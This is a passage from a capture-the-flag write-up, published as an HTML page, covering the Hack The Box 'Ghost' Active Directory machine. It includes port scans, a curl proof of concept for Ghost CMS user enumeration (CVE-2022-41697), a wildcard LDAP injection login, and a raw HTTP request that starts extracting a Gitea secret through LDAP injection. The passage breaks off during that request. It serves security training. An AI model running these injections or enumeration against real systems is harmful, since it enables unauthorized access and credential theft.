@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Ghost | Paracausal Telemetry</title><meta name="description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), HTTP (443)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-ghost/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Ghost" /><meta property="og:description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), HTTP (443)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-ghost/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-ghost/og.png?v=16ea7a42" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Ghost" /><meta name="twitter:description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), HTTP (443)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-ghost/og.png?v=16ea7a42" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Ghost","description":"Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), HTTP (443).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-ghost/","datePublished":"2026-08-25","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Ghost","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-ghost/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Ghost</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-08-25 · 28 min read</p><h1>Ghost</h1><p>Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), HTTP (443).</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · insane</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Ghost" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-ghost.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-ghost.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Ghost</h2><p>Ghost is an Insane Windows Active Directory machine that starts with an LDAP injection that an attacker can exploit to leak the credentials for a Gitea instance. Looking through the source code on the repositories, the attacker can combine an arbitrary file read attack with a…</p></div><span class="room-badge room-badge-insane">Insane</span></div><dl class="room-facts"><div><dt>Released</dt><dd>13 Jul 2024</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>tomadimitrie</dd></div><div><dt>Rating</dt><dd>4.7 / 5</dd></div><div><dt>User owns</dt><dd>1,771</dd></div><div><dt>Root owns</dt><dd>1,494</dd></div><div><dt>User blood</dt><dd>celesian<small class="room-blood-time">5H 4M 15S</small></dd></div><div><dt>Root blood</dt><dd>NLTE<small class="room-blood-time">5H 2M 28S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 1872 votes from easiest to hardest"><rect x="0" y="57" width="20" height="7" rx="2" fill="hsl(96 70% 55%)"><title>61 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>11 votes</title></rect><rect x="52" y="61" width="20" height="3" rx="2" fill="hsl(80 70% 55%)"><title>25 votes</title></rect><rect x="78" y="59" width="20" height="5" rx="2" fill="hsl(70 70% 55%)"><title>46 votes</title></rect><rect x="104" y="57" width="20" height="7" rx="2" fill="hsl(50 70% 55%)"><title>57 votes</title></rect><rect x="130" y="53" width="20" height="11" rx="2" fill="hsl(38 70% 55%)"><title>97 votes</title></rect><rect x="156" y="32" width="20" height="32" rx="2" fill="hsl(28 70% 55%)"><title>272 votes</title></rect><rect x="182" y="24" width="20" height="40" rx="2" fill="hsl(16 70% 55%)"><title>339 votes</title></rect><rect x="208" y="14" width="20" height="50" rx="2" fill="hsl(8 70% 55%)"><title>423 votes</title></rect><rect x="234" y="0" width="20" height="64" rx="2" fill="hsl(0 70% 55%)"><title>541 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 8.3, Real-Life 7.9, CVE 6.1, Custom Exploitation 3.9, CTF-Like 2.1"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,51.9 162.6,92.9 135.1,144.5 94.0,132.1 96.0,105.5" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Ghost" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.231.105 --generate-hosts-file /etc/hosts
+ 
+SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT dc01.ghost.htb        
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 16:40 +0100
+Nmap scan report for dc01.ghost.htb (10.129.231.105)
+Host is up (0.013s latency).
+rDNS record for 10.129.231.105: DC01.ghost.htb
+Not shown: 65508 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
+2179/tcp  open  vmrdp
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+8008/tcp  open  http
+8443/tcp  open  https-alt
+9389/tcp  open  adws
+49443/tcp open  unknown
+49664/tcp open  unknown
+49672/tcp open  unknown
+49681/tcp open  unknown
+63211/tcp open  unknown
+63351/tcp open  unknown
+64506/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.27 seconds</code></pre><p>Looks like there is port <code>2179</code> open, which means there is likely some virtualization</p><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389 -A --min-rate=2000 -sT dc01.ghost.htb
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 16:44 +0100
+Nmap scan report for dc01.ghost.htb (10.129.231.105)
+Host is up (0.013s latency).
+rDNS record for 10.129.231.105: DC01.ghost.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-25 15:44:34Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.ghost.htb
+| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
+| Not valid before: 2024-06-19T15:45:56
+|_Not valid after:  2124-06-19T15:55:55
+443/tcp  open  https?
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.ghost.htb
+| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
+| Not valid before: 2024-06-19T15:45:56
+|_Not valid after:  2124-06-19T15:55:55
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-08-25T15:36:31
+|_Not valid after:  2056-08-25T15:36:31
+| ms-sql-ntlm-info: 
+|   10.129.231.105:1433: 
+|     Target_Name: GHOST
+|     NetBIOS_Domain_Name: GHOST
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: ghost.htb
+|     DNS_Computer_Name: DC01.ghost.htb
+|     DNS_Tree_Name: ghost.htb
+|_    Product_Version: 10.0.20348
+|_ssl-date: 2026-08-25T15:45:59+00:00; 0s from scanner time.
+| ms-sql-info: 
+|   10.129.231.105:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+2179/tcp open  vmrdp?
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.ghost.htb
+| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
+| Not valid before: 2024-06-19T15:45:56
+|_Not valid after:  2124-06-19T15:55:55
+|_ssl-date: TLS randomness does not represent time
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.ghost.htb
+| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
+| Not valid before: 2024-06-19T15:45:56
+|_Not valid after:  2124-06-19T15:55:55
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-08-25T15:45:59+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=DC01.ghost.htb
+| Not valid before: 2026-08-24T15:33:38
+|_Not valid after:  2027-02-23T15:33:38
+| rdp-ntlm-info: 
+|   Target_Name: GHOST
+|   NetBIOS_Domain_Name: GHOST
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: ghost.htb
+|   DNS_Computer_Name: DC01.ghost.htb
+|   DNS_Tree_Name: ghost.htb
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-08-25T15:45:18+00:00
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8008/tcp open  http          nginx 1.18.0 (Ubuntu)
+|_http-generator: Ghost 5.78
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Ghost
+| http-robots.txt: 5 disallowed entries 
+|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
+8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-title: Ghost Core
+|_Requested resource was /login
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=core.ghost.htb
+| Subject Alternative Name: DNS:core.ghost.htb
+| Not valid before: 2024-06-18T15:14:02
+|_Not valid after:  2124-05-25T15:14:02
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel</code></pre><h2>SMB (445)</h2><p>Null auth is enabled but not able to list shares or users with it</p><p>The guest account is disabled!</p><h2>HTTP (80)</h2><p><img src="images/ghost/pasted-image-20260825165604.webp" alt="Screenshot" loading="lazy" /></p><p>Landing page just looks like a 404, however i dont think its a default 404 page</p><p>There are no subdomains</p><p>Feroxbuster did not find anything</p><p>Nuclei did not find anything</p><h2>HTTP (443)</h2><p>This site wont load, over either http or https, theres not a lot i can do with it right now</p><h2>HTTP (8008)</h2><p><img src="images/ghost/pasted-image-20260825171258.webp" alt="Screenshot" loading="lazy" /></p><p>Looks like a CMS of some sort called Ghost</p><p>Potential user <code>kathryn.holland</code>?</p><p>Opening the post, i can see the author <code>kathryn.holland</code> has a page inside <code>/author/</code>, its possible i can use this to find valid users</p><p><img src="images/ghost/pasted-image-20260825171334.webp" alt="Screenshot" loading="lazy" /></p><p>Using wappalyzer i can see that this service is being run off an ubuntu machine, this is likely the virtualization i mentioned earlier</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.ghost.htb -u kathryn.holland -p &#39;&#39; -k
+SMB         dc01.ghost.htb  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.ghost.htb  445    DC01             [-] ghost.htb\kathryn.holland: KDC_ERR_PREAUTH_FAILED</code></pre><p>Using kerberos i am able to use error output to determine valid users, looks like <code>kathryn.holland</code> is a valid domain user, this give me a valid username format</p><h3>Nuclei </h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nuclei -u http://ghost.htb:8008/ -rl 50 
+
+[CVE-2022-41697] [http] [medium] http://ghost.htb:8008/ghost/api/admin/session</code></pre><p>Found a CVE</p><h3>CVE-2022-41697</h3><blockquote><p>A user enumeration vulnerability exists in the login functionality of Ghost Foundation Ghost 5.9.4. A specially-crafted HTTP request can lead to a disclosure of sensitive information. An attacker can send a series of HTTP requests to trigger this vulnerability.</p></blockquote><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2022-1625" target="_blank" rel="noreferrer">https://talosintelligence.com/vulnerability_reports/TALOS-2022-1625</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H &#39;Content-Type: application/json&#39; --data &#39;{&quot;username&quot;:&quot;lkjasdfklasjdf@asdf.com&quot;,&quot;password&quot;:&quot;asdfasdfasdf&quot;}&#39; | jq .
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    291 100    227 100     64   2705    762                              0
+{
+  &quot;errors&quot;: [
+    {
+      &quot;message&quot;: &quot;There is no user with that email address.&quot;,
+      &quot;context&quot;: null,
+      &quot;type&quot;: &quot;NotFoundError&quot;,
+      &quot;details&quot;: null,
+      &quot;property&quot;: null,
+      &quot;help&quot;: null,
+      &quot;code&quot;: null,
+      &quot;id&quot;: &quot;8523fb70-a0a2-11f1-a02f-09a7d9773575&quot;,
+      &quot;ghostErrorCode&quot;: null
+    }
+  ]
+}</code></pre><p>Ill use the example POC in the article and see the error, this indicates this user doesnt exist</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H &#39;Content-Type: application/json&#39; --data &#39;{&quot;username&quot;:&quot;kathryn.holland@ghost.htb&quot;,&quot;password&quot;:&quot;asdfasdfasdf&quot;}&#39;
+{&quot;errors&quot;:[{&quot;message&quot;:&quot;Your password is incorrect.&quot;,&quot;context&quot;:&quot;Your password is incorrect.&quot;,&quot;type&quot;:&quot;ValidationError&quot;,&quot;details&quot;:null,&quot;property&quot;:null,&quot;help&quot;:&quot;Visit and save your profile after logging in to check for problems.&quot;,&quot;code&quot;:&quot;PASSWORD_INCORRECT&quot;,&quot;id&quot;:&quot;71ce7d20-a0a2-11f1-a02f-09a7d9773575&quot;,&quot;ghostErrorCode&quot;:null}]}</code></pre><p>But if i now test this POC with a user i know exists, i can see i get an error <code>Your password is incorrect</code> confirming the POC works</p><p>Another thing to note, the API is using domain credentials, since i know the user <code>kathryn.holland</code> is a domain user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H &#39;Content-Type: application/json&#39; --data &#39;{&quot;username&quot;:&quot;kathryn.holland@ghost.htb&quot;,&quot;password&quot;:&quot;asdfasdfasdf&quot;}&#39; | jq . 
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    394 100    328 100     66   4522    909                              0
+{
+  &quot;errors&quot;: [
+    {
+      &quot;message&quot;: &quot;Too many login attempts. Please wait 3 minutes before trying again, or reset your password.&quot;,
+      &quot;context&quot;: &quot;Too many login attempts.&quot;,
+      &quot;type&quot;: &quot;TooManyRequestsError&quot;,
+      &quot;details&quot;: null,
+      &quot;property&quot;: null,
+      &quot;help&quot;: &quot;Too many login attempts.&quot;,
+      &quot;code&quot;: null,
+      &quot;id&quot;: &quot;898d7aa0-a0a3-11f1-a02f-09a7d9773575&quot;,
+      &quot;ghostErrorCode&quot;: null
+    }
+  ]
+}</code></pre><p>If i send another request i see, there is a error for too many logon attempts, this prevents me from fuzzing the application to find valid users. But since the application is using domain credentials, kerbrute will work fine to enumerate users</p><h3>Ghost logon form</h3><p><img src="images/ghost/pasted-image-20260825174803.webp" alt="Screenshot" loading="lazy" /></p><p>When trying the logon, it uses that session endpoint, used above to try and find valid users</p><p>The forgot password function, doesnt actually send a request anywhere, eventually the request times out</p><h3>Subdomains</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ffuf -u http://ghost.htb:8008/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host: FUZZ.ghost.htb&#39; -ic -c -t 30 -fs 7676 
+
+intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 239ms]</code></pre><p>Found an intranet subdomain</p><h2>Access to the <code>intranet</code> subdomain on port 8008</h2><p>Using simple ldap injection</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Username: *
+Password: *</code></pre><p>I got access</p><p><img src="images/ghost/pasted-image-20260825182240.webp" alt="Screenshot" loading="lazy" /></p><p>I am logged in as <code>kathryn.holland</code></p><p>Also some interesting info on the homescreen</p><p><img src="images/ghost/pasted-image-20260826165723.webp" alt="Screenshot" loading="lazy" /></p><p>Some info on more users, thise looks to be domain users too!</p><p><img src="images/ghost/pasted-image-20260826170046.webp" alt="Screenshot" loading="lazy" /></p><p>Found another subdomain <code>bitbucket.ghost.htb</code></p><p>The bitbucket subdomain doesnt show anything, as shown in the screenshot above, the DNS entry is not configured</p><p>There is not a lot of functionality in this site, mostly just information</p><p>So i will safely assume there is a gitea subdomain, in all fairness im surprised none of these wordlists ive used contain gitea in them</p><h2><code>gitea</code> subdomain</h2><p><img src="images/ghost/pasted-image-20260826175125.webp" alt="Screenshot" loading="lazy" /></p><p>I have found the gitea install</p><p><img src="images/ghost/pasted-image-20260826175216.webp" alt="Screenshot" loading="lazy" /></p><p>Found the gitea version</p><p>I can also use <code>Explore</code> in the top left of the sight to view as a guest</p><p><img src="images/ghost/pasted-image-20260826175318.webp" alt="Screenshot" loading="lazy" /></p><p>Found some users</p><p>There is no repos or archived repos, ive tried using some default credentials but no luck</p><p>Im thinking i can use the LDAP injection on the intranet subdomain to pull out the secret, becuase remembering back it said domain logons were disabled, but i could log on to gitea using the secret and it could be found in LDAP</p><p>Ill prixy this request using caido</p><h2>LDAP injection to find <code>gitea_temp_principal</code> secret</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">POST /login HTTP/1.1
+Host: intranet.ghost.htb:8008
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/x-component
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://intranet.ghost.htb:8008/login
+Next-Action: c471eb076ccac91d6f828b671795550fd5925940
+Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
+Content-Type: multipart/form-data; boundary=----geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Length: 478
+Origin: http://intranet.ghost.htb:8008
+Connection: keep-alive
+Priority: u=0
+
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Disposition: form-data; name=&quot;1_ldap-username&quot;
+
+gitea_temp_principal
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Disposition: form-data; name=&quot;1_ldap-secret&quot;
+
+*
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Disposition: form-data; name=&quot;0&quot;
+
+[{},&quot;$K1&quot;]
